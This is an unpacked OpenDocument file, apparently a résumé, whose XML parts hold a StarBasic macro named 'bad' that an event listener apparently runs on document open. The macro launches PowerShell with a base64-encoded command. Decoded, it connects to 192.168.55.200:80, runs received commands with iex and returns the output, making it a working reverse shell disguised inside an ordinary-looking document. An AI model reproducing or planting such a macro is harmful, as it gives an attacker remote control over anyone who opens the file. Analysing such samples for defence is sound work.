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bad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bad.Main?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts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a8f" officeooo:paragraph-rsid="001b7a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y this is my resu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14:06:52.484128836</meta:creation-date>
    <dc:date>2022-03-16T14:28:32.107458266</dc:date>
    <meta:editing-duration>PT14M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5" meta:character-count="21" meta:non-whitespace-character-count="17"/>
  </office:meta>
</office:document-meta>
</file>

<file path=Basic/Standard/bad.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="bad" script:language="StarBasic">REM  *****  BASIC  *****

Sub Main
	Shell("cmd.exe /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADUANQAuADIAMAAwACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA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d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